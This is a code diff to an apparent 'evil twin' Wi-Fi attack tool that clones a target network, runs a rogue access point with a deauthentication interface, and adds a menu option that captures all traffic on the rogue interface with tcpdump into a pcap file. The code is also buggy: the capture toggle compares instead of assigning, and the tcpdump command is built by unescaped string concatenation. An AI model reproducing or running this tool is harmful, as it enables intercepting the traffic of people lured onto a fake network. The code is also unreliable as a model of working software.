@@ -28,9 +28,9 @@ def displayMenu():
 	print("Interface DeAuth :", settings.globals["interfaceDeauth"])
 	print("Selected WIFI :", settings.globals["targetWifi"])
 	print("bssid :", settings.globals["bssid"])
-	print("channel :", settings.globals["channel"], "\n")
-
-	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Exit"]
+	print("channel :", settings.globals["channel"])
+	print("Capture Packets : ", settings.globals["capture"], "\n")
+	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Start/Stop Packets capture", "Exit"]
 	terminal_menu = TerminalMenu(options)
 	menu_entry_index = terminal_menu.show()
 	match menu_entry_index:
@@ -41,6 +41,8 @@ def displayMenu():
 		case 2:
 			startTwin()
 		case 3:
+			capturePackets(settings.globals["interfaceAP"])
+		case 4:
 			return False
 	return True
 
@@ -157,3 +159,12 @@ def startTwin():
 	dnsmasqServerInit(settings.globals["interfaceAP"])
 	dnsmasqServer()
 	hostapdEnable()
+
+def capturePackets(wlan):
+	call(["gnome-terminal", "-x", "sh", "-c", "dnsmasq -d -C conf/confDnsmasq.txt; bash"])
+	shell("tcpdump -i " + wlan + " -s 65535 -w dataCaptured.pcap")
+	if settings.globals["capture"] == 'OFF':
+		settings.globals["capture"] == 'ON'
+	if 	settings.globals["capture"] == 'ON':
+		settings.globals["capture"] == 'OFF'
+	
